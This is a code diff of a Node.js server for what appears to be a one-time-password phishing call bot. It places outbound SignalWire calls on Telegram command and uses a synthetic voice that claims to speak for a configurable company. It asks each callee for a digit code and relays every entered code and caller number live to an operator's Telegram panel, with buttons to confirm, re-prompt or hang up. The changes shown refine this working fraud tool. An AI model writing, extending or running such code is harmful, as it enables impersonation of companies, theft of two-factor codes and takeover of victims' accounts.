@@ -25,12 +25,12 @@ assistant:0
 }
 
 const assistants=[
-"Polly.Joanna",
-"Polly.Amy",
-"Polly.Brian",
-"Polly.Matthew",
-"Polly.Ivy",
-"Polly.Justin"
+{ name:"Nova",voice:"Polly.Joanna"},
+{ name:"Lyra",voice:"Polly.Amy"},
+{ name:"Orion",voice:"Polly.Brian"},
+{ name:"Astra",voice:"Polly.Matthew"},
+{ name:"Kairo",voice:"Polly.Ivy"},
+{ name:"Solara",voice:"Polly.Justin"}
 ]
 
 // STATE
@@ -40,8 +40,13 @@ let activeCode=null
 let callStart=null
 let lastCaller=null
 let panelMessageId=null
-
+let pendingAction=null
 let logs=[]
+
+// AUTH
+function auth(){
+return "Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64")
+}
 
 // TELEGRAM
 async function tg(method,data){
@@ -53,23 +58,21 @@ body:JSON.stringify(data)
 }
 
 async function tgSend(text,buttons=null){
-
 const body={chat_id:CHAT_ID,text}
-
-if(buttons){
-body.reply_markup={inline_keyboard:buttons}
-}
-
+if(buttons) body.reply_markup={inline_keyboard:buttons}
 return tg("sendMessage",body)
 }
 
 // PANEL TEXT
 function panelText(){
 
-let duration="0s"
+let duration="00:00"
 
 if(callStart){
-duration=Math.floor((Date.now()-callStart)/1000)+"s"
+let s=Math.floor((Date.now()-callStart)/1000)
+let m=Math.floor(s/60)
+let sec=s%60
+duration=`${String(m).padStart(2,"0")}:${String(sec).padStart(2,"0")}`
 }
 
 return `📞 IVR CONTROL PANEL
@@ -80,7 +83,7 @@ Duration: ${duration}
 
 Company: ${settings.company}
 Digits: ${settings.digits}
-Voice: ${settings.assistant+1}`
+Assistant: ${assistants[settings.assistant].name}`
 }
 
 // PANEL BUTTONS
@@ -88,13 +91,13 @@ function panelButtons(){
 return[
 [
 {text:"✔ Confirm",callback_data:"confirm"},
-{text:"🔁 Ask Again",callback_data:"again"}
+{text:"🔁 Ask Again",callback_data:"retry"}
 ],
 [
 {text:"⛔ Hang Up",callback_data:"hangup"}
 ],
 [
-{text:"📞 Start Call",callback_data:"call"},
+{text:"📞 Start Call",callback_data:"startcall"},
 {text:"☎ Call Last",callback_data:"calllast"}
 ],
 [
@@ -104,26 +107,22 @@ return[
 ]
 }
 
-// PANEL UPDATE
+// UPDATE PANEL
 async function updatePanel(){
 
 if(!panelMessageId){
-
-const msg=await tgSend(panelText(),panelButtons())
-
+let msg=await tgSend(panelText(),panelButtons())
 panelMessageId=msg.result.message_id
 return
 }
 
 try{
-
 await tg("editMessageText",{
 chat_id:CHAT_ID,
 message_id:panelMessageId,
 text:panelText(),
 reply_markup:{inline_keyboard:panelButtons()}
 })
-
 }catch{}
 }
 
@@ -139,14 +138,13 @@ const digits=req.body.Digits
 const caller=req.body.From
 const sid=req.body.CallSid
 
-// ASK CODE
 if(!digits){
 
 res.type("text/xml")
 return res.send(`
 <Response>
 <Gather numDigits="${settings.digits}" action="${BASE_URL}/ivr">
-<Say voice="${assistants[settings.assistant]}">
+<Say voice="${assistants[settings.assistant].voice}">
 Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
 </Say>
 </Gather>
@@ -155,7 +153,6 @@ Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
 `)
 }
 
-// SAVE
 activeCallSid=sid
 activeCaller=caller
 activeCode=digits
@@ -165,12 +162,12 @@ callStart=callStart||Date.now()
 logs.unshift(`${caller} : ${digits}`)
 logs=logs.slice(0,10)
 
-// FAST RESPONSE FIRST
+// FAST RESPONSE
 res.type("text/xml")
 res.send(`
 <Response>
-<Say voice="${assistants[settings.assistant]}">
-Thank you. Your code has been received.
+<Say voice="${assistants[settings.assistant].voice}">
+Thank you. Your code has been received. Please hold.
 </Say>
 <Redirect>${BASE_URL}/hold</Redirect>
 </Response>
@@ -178,29 +175,23 @@ Thank you. Your code has been received.
 
 // TELEGRAM AFTER
 setTimeout(async()=>{
-
-try{
-
 await tgSend(`📞 CODE RECEIVED
 
 Caller: ${caller}
 Code: ${digits}`)
 
 updatePanel()
-
-}catch{}
-
 },0)
 
 })
 
-// HOLD
+// HOLD LOOP
 app.post("/hold",(req,res)=>{
 
 res.type("text/xml")
 res.send(`
 <Response>
-<Pause length="10"/>
+<Pause length="8"/>
 <Redirect>${BASE_URL}/hold</Redirect>
 </Response>
 `)
@@ -217,37 +208,24 @@ if(msg){
 
 const text=msg.text
 
-if(text==="/panel"||text==="/menu"){
+if(text==="/panel"||text==="/menu"||text==="/status"){
 panelMessageId=null
 updatePanel()
 }
 
-if(text==="/status"){
-updatePanel()
-}
-
 if(text==="/logs"){
-
-let text="📜 Logs\n\n"
-
-logs.forEach(l=>{
-text+=l+"\n"
-})
-
-tgSend(text)
-
+let t="📜 Logs\n\n"
+logs.forEach(l=>t+=l+"\n")
+tgSend(t)
 }
 
 if(text.startsWith("/call ")){
-
-const number=text.split(" ")[1]
-
-await startCall(number)
-
+let num=text.split(" ")[1]
+startCall(num)
 }
 
 if(text==="/calllast"){
-await startCall(lastCaller)
+startCall(lastCaller)
 }
 
 }
@@ -262,20 +240,16 @@ await endCall()
 tgSend("✔ Confirmed")
 }
 
-if(action==="again"){
-await replayIVR()
+if(action==="retry"){
+await retryCall()
 }
 
 if(action==="hangup"){
 await endCall()
 }
 
-if(action==="call"){
-tgSend("Send number to call")
-}
-
 if(action==="calllast"){
-await startCall(lastCaller)
+startCall(lastCaller)
 }
 
 if(action==="status"){
@@ -283,15 +257,9 @@ updatePanel()
 }
 
 if(action==="logs"){
-
-let text="📜 Logs\n\n"
-
-logs.forEach(l=>{
-text+=l+"\n"
-})
-
-tgSend(text)
-
+let t="📜 Logs\n\n"
+logs.forEach(l=>t+=l+"\n")
+tgSend(t)
 }
 
 }
@@ -300,13 +268,13 @@ res.sendStatus(200)
 
 })
 
-// OUTBOUND CALL
+// START CALL
 async function startCall(number){
 
 await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`,{
 method:"POST",
 headers:{
-Authorization:"Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
+Authorization:auth(),
 "Content-Type":"application/x-www-form-urlencoded"
 },
 body:new URLSearchParams({
@@ -326,7 +294,7 @@ if(!activeCallSid)return
 await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
 method:"POST",
 headers:{
-Authorization:"Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
+Authorization:auth(),
 "Content-Type":"application/x-www-form-urlencoded"
 },
 body:new URLSearchParams({Status:"completed"})
@@ -336,15 +304,16 @@ activeCallSid=null
 activeCode=null
 callStart=null
 updatePanel()
+
 }
 
-// REPLAY IVR
-async function replayIVR(){
+// RETRY
+async function retryCall(){
 
 await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
 method:"POST",
 headers:{
-Authorization:"Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
+Authorization:auth(),
 "Content-Type":"application/x-www-form-urlencoded"
 },
 body:new URLSearchParams({Url:`${BASE_URL}/ivr`})
@@ -352,7 +321,7 @@ body:new URLSearchParams({Url:`${BASE_URL}/ivr`})
 
 }
 
-// PANEL TIMER
+// LIVE PANEL TIMER
 setInterval(updatePanel,2000)
 
 app.listen(PORT,()=>{
